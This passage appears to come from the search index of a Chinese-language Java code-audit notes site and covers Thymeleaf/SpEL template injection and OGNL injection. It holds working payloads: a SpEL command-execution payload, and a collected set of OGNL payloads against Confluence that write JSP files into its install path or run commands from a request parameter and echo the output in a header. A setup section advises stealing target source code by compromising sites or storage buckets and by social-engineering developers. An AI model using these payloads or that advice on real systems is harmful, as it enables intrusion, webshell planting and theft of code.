document); //FP } \u53ea\u9700\u8981\u5728\u53c2\u6570\u91cc\u52a0\u4e0a HttpServletResponse response\uff0cspring\u5c31\u4e0d\u4f1a\u518d\u5bf9\u89c6\u56fe\u8fdb\u884c\u89e3\u6790\u3002 \u53ea\u5bf9\u8fd9\u79cd\u76f4\u63a5\u4eceurl\u83b7\u53d6\u6a21\u677f\u540d\u7684\u63a7\u5236\u5668\u6709\u6548","title":"HttpServletResponse&#x20;"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#_7","text":"\u8fd9\u4e2a\u9879\u76ee\u4e5f\u63d0\u4f9b\u4e86\u4e09\u4e2a\u63a7\u5236\u5668\u7684\u4fee\u590d\u7248","title":"\u9632\u5fa1"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#responsebody-restcontroller","text":"@GetMapping(\"/safe/fragment\") @ResponseBody public String safeFragment(@RequestParam String section) { return \"welcome :: \" + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name } \u6ce8\u610ftemplatename\u5fc5\u987b\u88ab \\${} \u5305\u56f4\uff0cselector\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5fc5\u987b\u4e3a . \u5982\u679c\u6211\u4eeclang\u8d4b\u503c\u4e3a \\${4*4} ::123\uff0c\u53ef\u4ee5\u53d1\u73b0\u9884\u5904\u7406\u8868\u8fbe\u5f0f\u91cc\u7684\u5185\u5bb9\u88ab\u89e3\u6790\u4e86\uff0c\u5e76\u4ee5\u62a5\u9519\u7684\u5f62\u5f0f\u8fd4\u56de\uff08\u6ce8\u610fpaylaod\u9700\u8981urlencode\uff09 \u90a3\u4e48\u8fd9\u4e2a :: \u5230\u5e95\u610f\u5473\u7740\u4ec0\u4e48\u5462\uff0c\u6211\u4eec\u4e0a\u9762\u7684payload\u540e\u9762\u4e3a\u4ec0\u4e48\u8fd8\u8981\u8ddf\u7740\u4e00\u4e32\u5b57\u7b26\u5462\uff1f :: \u662f\u7247\u6bb5\u9009\u62e9\u5668\u7684\u5206\u9694\u7b26\uff0c\u5206\u5272templatename\u548cselector\uff0c\u5373templatename::selector\uff0ctemplatename\u548cselector\u90fd\u4f1a\u88ab\u5f53\u4f5c\u8868\u8fbe\u5f0f\u7684\u90e8\u5206\u89e3\u6790\u4e00\u8d77\u89e3\u6790\uff0c\u5373\u5b9e\u9645\u4e0a\u89e3\u6790\u7684\u5185\u5bb9\u662f \\~{templatename::selector} \u6bd4\u5982\u5728\u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\uff0cwelcome\u662ftemplatename\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9/templates/welcome.html \u7684selector\u6765\u6307\u5b9a\u9875\u9762\u663e\u793a\u4f55\u79cd\u5185\u5bb9 @GetMapping(\"/fragment\") public String fragment(@RequestParam String section) { return \"welcome :: \" + section; //fragment is tainted } <!DOCTYPE HTML> <html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"> <div th:fragment=\"header\"> //\u5982\u679cselector \u662fheader\uff0c\u90a3\u4e48\u53ea\u663e\u793a\u8be5div\u4e2d\u7684\u5185\u5bb9 <h3>Spring Boot Web Thymeleaf Example</h3> </div> <div th:fragment=\"main\"> ////\u5982\u679cselector \u662fmain\uff0c\u90a3\u4e48\u53ea\u663e\u793a\u8be5div\u4e2d\u7684\u5185\u5bb9 <span th:text=\"'Hello, ' + ${message}\"></span> </div> </html> \u8fd8\u6709\u4e0b\u56fe\u8fd9\u79cd\u795e\u5947\u4ee3\u7801 @GetMapping(\"/doc/{document}\") public void getDocument(@PathVariable String document) { log.info(\"Retrieving \" + document); //returns void, so view name is taken from URI } \u4ee3\u7801\u5e76\u6ca1\u6709\u8fd4\u56de\u89c6\u56fe\uff0c\u4f46\u662f\u6ce8\u610f\u8def\u7531\u4e2d\u7684{document}\uff0c\u8fd9\u91cc\u4f1a\u76f4\u63a5\u628a/doc/{document}\u7528\u4f5c\u89c6\u56fe\u540d\u8fd4\u56de","title":"ResponseBody RestController"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/#thymeleaf_1","text":"\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u8868\u8fbe\u5f0f\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b9e\u73b0Spel\u8868\u8fbe\u5f0f\u6ce8\u5165\u4e86 \u6839\u636e\u4e0a\u4e00\u5c0f\u8282\u7684\u77e5\u8bc6\uff0c\u6211\u4eec\u53ef\u4ee5\u5f88\u8f7b\u677e\u7684\u6784\u9020\u4e0b\u9762\u8fd9\u4e32\u4ee3\u7801\u7684payload\uff0c\u901a\u8fc7\u62a5\u9519\u628a\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u5e26\u51fa\u6765 @GetMapping(\"/path\") public String path(@RequestParam String lang) { return \"user/\" + lang + \"/welcome\"; //template path is tainted } payload:__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()).next()}__:: \u90a3\u4e48\u8fd9\u4e32\u4ee3\u7801\u5462\uff1f\u6211\u4eec\u53ea\u6709selector\u53ef\u63a7 @GetMapping(\"/fragment\") public String fragment(@RequestParam String section) { return \"welcome :: \" + section; //fragment is tainted } \u5b9e\u6218\u4e2d\u53ef\u4ee5\u53d1\u73b0\u662f\u65e0\u6cd5\u76f4\u63a5\u5f97\u5230\u56de\u663e\u7684\uff08\u56e0\u4e3a\u4e0d\u62a5\u9519\uff09\uff0c\u4f46\u662f\u547d\u4ee4\u4f9d\u65e7\u4f1a\u88ab\u89e3\u6790\u6267\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7dns\u5916\u5e26\u7b49\u65b9\u5f0f\u5e26\u51fa\u7ed3\u679c \u4f1a\u53d1\u73b0\u7b2c\u4e09\u884c\u548c\u5012\u6570\u7b2c\u4e09\u884c\u90fd\u7528\u5230\u4e86th: \u8fd9\u4e2a\u524d\u7f00\uff0c\u8fd9\u4e2a\u524d\u7f00\u5c31\u662f\u4f7f\u7528Thymeleaf\u7684\u6807\u5fd7\uff0c\u7528\u4e8e\u8c03\u7528Thymeleaf\u5185\u90e8\u7684\u65b9\u6cd5\u3002","title":"Thymeleaf \u6a21\u677f\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/","text":"ognl \u6ce8\u5165 \u76ee\u5f55 \u4ecb\u7ecd \u539f\u7406 DEMO ognl\u8bed\u6cd5 payload\u6574\u7406 \u5173\u952e\u5b57 \u4ecb\u7ecd \u8868\u8fbe\u5f0f\u7684\u4e00\u79cd \u539f\u7406 DEMO ognl\u4e09\u8981\u7d20\uff1aexpression\u8868\u8fbe\u5f0f/root \u6839\u5bf9\u8c61/context \u4e0a\u4e0b\u6587 \u600e\u6837\u89e6\u53d1\u4e00\u4e2aexpression\uff1f ObjectA A = new ObjectA(); //\u4e00\u4e2a\u4efb\u610f\u5bf9\u8c61A OgnlContext context = new OgnlContext(); //\u521b\u5efacontext context.setName(A) //\u521d\u59cb\u5316context\u7684\u6839\u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u8981\u64cd\u4f5c\u7684\u5bf9\u8c61 String expression = \"A.a\" // \u8868\u8fbe\u5f0f\u5c31\u662f\u5b57\u7b26\u4e32\u7684\u6837\u5b50\uff0c\u8fd9\u91cc\u7684\u610f\u601d\u662f\u8c03\u7528\u5bf9\u8c61A\u7684a\u65b9\u6cd5 Object ognl = Ognl.parseExpression(expression) //\u89e3\u6790\u8868\u8fbe\u5f0f Object value = Ognl.getValue(ognl,context,context.getRoot()); //\u8c03\u7528\u8868\u8fbe\u5f0f\u5e76\u83b7\u53d6\u8fd4\u56de\u503c ognl\u8bed\u6cd5 . \u83b7\u53d6\u5bf9\u8c61\u7684\u5c5e\u6027\u6216\u8c03\u7528\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002 A.a @ \u83b7\u53d6\u9759\u6001\u7c7b/\u9759\u6001\u5c5e\u6027\u6216\u8c03\u7528\u9759\u6001\u65b9\u6cd5 @java.lang.Runtime@getRuntime().exec() ## 1.\u8c03\u7528\u975eroot\u5bf9\u8c61 // \u653e\u5165Context\u4e2d\uff0c\u4f46\u4e0d\u662froot context.put(\"user\", user) // \u521b\u5efaExpression\uff0c\u975eroot\uff0c\u6240\u4ee5\u8981\u52a0\u4e0a# String expression = \"#user.name\"; Object ognl = Ognl.parseExpression(expression); // \u8c03\u7528 Object value = Ognl.getValue(ognl,context,context.getRoot()); 2.\u521b\u5efamap #{\"name\": \"chenlvtang\", \"level\": \"noob\"} 3.\u5b9a\u4e49\u53d8\u91cf #a=new java.lang.String[]{\"calc\"} % \u5728\u6807\u5fd7\u7684\u5c5e\u6027\u4e3a\u5b57\u7b26\u4e32\u7c7b\u578b\u65f6\uff0c\u544a\u8bc9\u6267\u884c\u73af\u5883%{}\u91cc\u7684\u662fOGNL\u8868\u8fbe\u5f0f\u5e76\u8ba1\u7b97\u8868\u8fbe\u5f0f\u7684\u503c %{1+1} rce\u7684ognl payload\uff1a (#a=new java.lang.String(\"calc\")).(@java.lang.Runtime@getRuntime().exec(#a)) \u5199\u6587\u4ef6 ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',true)).(#bb0.write(new String(@java.util.Base64@getDecoder().decode('MTIz')))).(#bb0.close())} ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf3.jsp',true)).(#bb0.write('123')).(#bb0.close())} \u4f46\u662f\u8fd9\u4e2apayload\u7528\u5230\u4e86Runtime\u7c7b\uff0cOGNL\u5728>=3.1.25\u3001>=3.2.12\u7684\u7248\u672c\u4e2d\u589e\u52a0\u4e86\u9ed1\u540d\u5355\uff0cban\u4e86\u5f88\u591a\u5371\u9669\u7c7b\uff0c\u5305\u62ecRuntime\u3002 AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) || ClassResolver.class.isAssignableFrom(methodDeclaringClass) || MethodAccessor.class.isAssignableFrom(methodDeclaringClass) || MemberAccess.class.isAssignableFrom(methodDeclaringClass) || OgnlContext.class.isAssignableFrom(methodDeclaringClass) || Runtime.class.isAssignableFrom(methodDeclaringClass) || ClassLoader.class.isAssignableFrom(methodDeclaringClass) || ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) || AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass) payload\u6574\u7406 confluence \u7684\u601d\u8def ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',false)).(#bb0.write(@java.util.Base64@getDecoder().decode(''))).(#bb0.close())} base64\u5199\u6587\u4ef6 ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',false)).(#bb0.write(new java.lang.String(@java.util.Base64@getDecoder().decode('')))).(#bb0.close())} \uff5cbase64\u5199\u6587\u4ef6,\u5305\u4e86\u4e00\u5c42\uff0c\u5982\u679c\u4e0a\u9762\u6307\u4ee4\u4e0d\u80fd\u7528\uff0c\u8bd5\u8bd5\u8fd9\u4e2a ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf3.jsp',true)).(#bb0.write('')).(#bb0.close())} \u660e\u6587\u5199\u6587\u4ef6 ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(@com.opensymphony.webwork.ServletActionContext@getRequest().getParameter(\"search\")).getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))} post search\u53c2\u6570\u6307\u5b9a\u547d\u4ee4 ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',true)).(#bb0.write(new String(@java.util.Base64@getDecoder().decode('MTIz')))).(#bb0.close())} post search\u53c2\u6570\u6307\u5b9a \u5199\u5165\u5185\u5bb9 \u5173\u952e\u5b57 Ognl.getValue","title":"ognl \u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/#ognl","text":"","title":"ognl \u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/#_1","text":"\u4ecb\u7ecd \u539f\u7406 DEMO ognl\u8bed\u6cd5 payload\u6574\u7406 \u5173\u952e\u5b57","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/#_2","text":"\u8868\u8fbe\u5f0f\u7684\u4e00\u79cd","title":"\u4ecb\u7ecd"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/#_3","text":"","title":"\u539f\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/#demo","text":"ognl\u4e09\u8981\u7d20\uff1aexpression\u8868\u8fbe\u5f0f/root \u6839\u5bf9\u8c61/context \u4e0a\u4e0b\u6587 \u600e\u6837\u89e6\u53d1\u4e00\u4e2aexpression\uff1f ObjectA A = new ObjectA(); //\u4e00\u4e2a\u4efb\u610f\u5bf9\u8c61A OgnlContext context = new OgnlContext(); //\u521b\u5efacontext context.setName(A) //\u521d\u59cb\u5316context\u7684\u6839\u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u8981\u64cd\u4f5c\u7684\u5bf9\u8c61 String expression = \"A.a\" // \u8868\u8fbe\u5f0f\u5c31\u662f\u5b57\u7b26\u4e32\u7684\u6837\u5b50\uff0c\u8fd9\u91cc\u7684\u610f\u601d\u662f\u8c03\u7528\u5bf9\u8c61A\u7684a\u65b9\u6cd5 Object ognl = Ognl.parseExpression(expression) //\u89e3\u6790\u8868\u8fbe\u5f0f Object value = Ognl.getValue(ognl,context,context.getRoot()); //\u8c03\u7528\u8868\u8fbe\u5f0f\u5e76\u83b7\u53d6\u8fd4\u56de\u503c","title":"DEMO"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/#ognl_1","text":". \u83b7\u53d6\u5bf9\u8c61\u7684\u5c5e\u6027\u6216\u8c03\u7528\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002 A.a @ \u83b7\u53d6\u9759\u6001\u7c7b/\u9759\u6001\u5c5e\u6027\u6216\u8c03\u7528\u9759\u6001\u65b9\u6cd5 @java.lang.Runtime@getRuntime().exec() ## 1.\u8c03\u7528\u975eroot\u5bf9\u8c61 // \u653e\u5165Context\u4e2d\uff0c\u4f46\u4e0d\u662froot context.put(\"user\", user) // \u521b\u5efaExpression\uff0c\u975eroot\uff0c\u6240\u4ee5\u8981\u52a0\u4e0a# String expression = \"#user.name\"; Object ognl = Ognl.parseExpression(expression); // \u8c03\u7528 Object value = Ognl.getValue(ognl,context,context.getRoot()); 2.\u521b\u5efamap #{\"name\": \"chenlvtang\", \"level\": \"noob\"} 3.\u5b9a\u4e49\u53d8\u91cf #a=new java.lang.String[]{\"calc\"} % \u5728\u6807\u5fd7\u7684\u5c5e\u6027\u4e3a\u5b57\u7b26\u4e32\u7c7b\u578b\u65f6\uff0c\u544a\u8bc9\u6267\u884c\u73af\u5883%{}\u91cc\u7684\u662fOGNL\u8868\u8fbe\u5f0f\u5e76\u8ba1\u7b97\u8868\u8fbe\u5f0f\u7684\u503c %{1+1} rce\u7684ognl payload\uff1a (#a=new java.lang.String(\"calc\")).(@java.lang.Runtime@getRuntime().exec(#a)) \u5199\u6587\u4ef6 ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',true)).(#bb0.write(new String(@java.util.Base64@getDecoder().decode('MTIz')))).(#bb0.close())} ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf3.jsp',true)).(#bb0.write('123')).(#bb0.close())} \u4f46\u662f\u8fd9\u4e2apayload\u7528\u5230\u4e86Runtime\u7c7b\uff0cOGNL\u5728>=3.1.25\u3001>=3.2.12\u7684\u7248\u672c\u4e2d\u589e\u52a0\u4e86\u9ed1\u540d\u5355\uff0cban\u4e86\u5f88\u591a\u5371\u9669\u7c7b\uff0c\u5305\u62ecRuntime\u3002 AccessibleObjectHandler.class.isAssignableFrom(methodDeclaringClass) || ClassResolver.class.isAssignableFrom(methodDeclaringClass) || MethodAccessor.class.isAssignableFrom(methodDeclaringClass) || MemberAccess.class.isAssignableFrom(methodDeclaringClass) || OgnlContext.class.isAssignableFrom(methodDeclaringClass) || Runtime.class.isAssignableFrom(methodDeclaringClass) || ClassLoader.class.isAssignableFrom(methodDeclaringClass) || ProcessBuilder.class.isAssignableFrom(methodDeclaringClass) || AccessibleObjectHandlerJDK9Plus.unsafeOrDescendant(methodDeclaringClass)","title":"ognl\u8bed\u6cd5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/#payload","text":"confluence \u7684\u601d\u8def ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',false)).(#bb0.write(@java.util.Base64@getDecoder().decode(''))).(#bb0.close())} base64\u5199\u6587\u4ef6 ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',false)).(#bb0.write(new java.lang.String(@java.util.Base64@getDecoder().decode('')))).(#bb0.close())} \uff5cbase64\u5199\u6587\u4ef6,\u5305\u4e86\u4e00\u5c42\uff0c\u5982\u679c\u4e0a\u9762\u6307\u4ee4\u4e0d\u80fd\u7528\uff0c\u8bd5\u8bd5\u8fd9\u4e2a ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf3.jsp',true)).(#bb0.write('')).(#bb0.close())} \u660e\u6587\u5199\u6587\u4ef6 ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(@com.opensymphony.webwork.ServletActionContext@getRequest().getParameter(\"search\")).getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))} post search\u53c2\u6570\u6307\u5b9a\u547d\u4ee4 ${(#bb0=new java.io.FileWriter('/opt/atlassian/confluence/confluence/conf9.jsp',true)).(#bb0.write(new String(@java.util.Base64@getDecoder().decode('MTIz')))).(#bb0.close())} post search\u53c2\u6570\u6307\u5b9a \u5199\u5165\u5185\u5bb9","title":"payload\u6574\u7406"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/ognl%20%E6%B3%A8%E5%85%A5/#_4","text":"Ognl.getValue","title":"\u5173\u952e\u5b57"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E4%B8%8E%E6%80%9D%E8%B7%AF/","text":"\u73af\u5883\u51c6\u5907\u4e0e\u601d\u8def \u76ee\u5f55 \u51c6\u5907\u6e90\u7801 jar\u53cd\u7f16\u8bd1\\&jar\u5bfc\u5165\u4f9d\u8d56 class\u53cd\u7f16\u8bd1 \u8fdc\u7a0b\u8c03\u8bd5 \u5feb\u6377\u952e\u63a8\u8350 \u4e0a\u624b\u601d\u8def \u5e38\u89c1\u654f\u611f\u51fd\u6570\u641c\u96c6 \u51c6\u5907\u6e90\u7801 \u5ba1\u8ba1\u4ee3\u7801\u80af\u5b9a\u5f97\u5148\u6709\u6e90\u7801\uff0c\u6e90\u7801\u90fd\u6ca1\u6709\u5ba1\u5bc4\u5427\u3002 \u6e90\u7801\u600e\u4e48\u6765\uff1f \u63d0\u53d6\u76ee\u6807\u7cfb\u7edf\u7279\u5f81\u53bbgithub\u7b49\u4ee3\u7801\u6258\u7ba1\u5e73\u53f0\uff0cgooglehacking\u641c\u4e00\u641c \u7528\u73b0\u6210\u7684\u6d1e\u53bb\u7f51\u4e0a\u6253\u4e2a\u7ad9\u4e0b\u6765\u6252\u6e90\u7801\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u6253\u4e0b\u8fd0\u7ef4\u673a\u627e\u5230\u6e90\u7801/\u6253\u4e0b\u5b58\u50a8\u6876\u627e\u5230\u6e90\u7801/\u6253\u4e0b\u65c1\u7ad9\u6216\u4e3b\u6218\u6252\u6e90\u7801\uff09 \u76ee\u5f55\u626b\u63cf\u53bb\u626b\u5907\u4efd\u6587\u4ef6\uff0c\u7eaf\u770b\u8fd0\u6c14 \u6dd8\u5b9d/\u54b8\u9c7c\uff08\u6700\u9760\u8c31 \u793e\u5de5\u5f00\u53d1\u4eba\u5458 \u5982\u679c\u76ee\u6807\u4f01\u4e1a\u6709gitlab\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u65b0\u6ce8\u518c\u4e00\u4e2a\u7528\u6237\u80fd\u8fdb\u53bb\u62ff\u5230\u6e90\u7801\u4e0d py jar\u53cd\u7f16\u8bd1\\&jar\u5bfc\u5165\u4f9d\u8d56 \u5f88\u591a\u65f6\u5019\u6211\u4eec\u62ff\u5230\u6e90\u7801\u4f1a\u53d1\u73b0\u6709\u5f88\u591ajar\u5305\uff0c\u8fd9\u4e9bjar\u5305\u6211\u4eec\u5f97\u53cd\u7f16\u8bd1\u4e00\u4e0b\u624d\u80fd\u7ee7\u7eed\u5ba1\u8ba1\u3002 \u867d\u7136idea\u5df2\u7ecf\u81ea\u5e26\u5bf9jar\u7684\u53cd\u7f16\u8bd1\uff0c\u4f46\u662fidea\u5927\u591a\u6570\u65f6\u5019\u4e0d\u4f1a\u5bf9jar\u91cc\u7684\u5185\u5bb9\u7f16\u5236\u7d22\u5f15\uff0c\u5bfc\u81f4\u6211\u4eec\u4e0d\u80fd\u5bf9jar\u5305\u91cc\u7684\u5185\u5bb9\u8fdb\u884c\u641c\u7d22\uff0c\u6240\u4ee5\u8fd9\u91cc\u5efa\u8bae\u662f\u81ea\u5df1\u53cd\u7f16\u8bd1\u4e00\u6b21\u6240\u6709jar\u5305\uff0c\u5e76\u653e\u5230\u4e00\u4e2a\u6587\u4ef6\u5939\u91cc\uff0c\u518d\u628a\u8fd9\u4e2a\u6587\u4ef6\u5939\u653e\u5230idea\u9879\u76ee\u6587\u4ef6\u91cc\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728idea\u5bf9jar\u5305\u91cc\u53cd\u7f16\u8bd1\u51fa\u6765\u7684\u5185\u5bb9\u8fdb\u884c\u5168\u5c40\u641c\u7d22\u4e86\u3002 \u4e00\u952e\u5bfc\u51fa\u6587\u4ef6\u5939\u4e0b\u6240\u6709jar\u5305 find ./ -name \"*.jar\" -exec cp {} targetpath \\; targetpath \u76ee\u6807\u6587\u4ef6\u5939 \u53cd\u7f16\u8bd1\u8bf4\u5b8c\u4e86\uff0c\u53e6\u4e00\u6b65\u5f97\u628a\u5bfc\u51fa\u6765\u7684jar\u5305\u6dfb\u52a0\u5230idea\u7684\u4f9d\u8d56\u91cc\u9762\uff0c\u8fd9\u6837\u624d\u80fd\u5728jar\u5305\u91cc\u7684class\u6587\u4ef6\u4e2d\u4e0b\u65ad\u70b9\u8fdb\u884c\u8fdc\u7a0b\u8c03\u8bd5\uff1a\u9879\u76ee\u7ed3\u6784\u2192\u6a21\u5757\u2192\u4f9d\u8d56\uff0c\u7136\u540e\u628a\u5bfc\u51fa\u6765\u7684jar\u6587\u4ef6\u5939\u6dfb\u52a0\u8fdb\u4f9d\u8d56\u3002 class\u53cd\u7f16\u8bd1 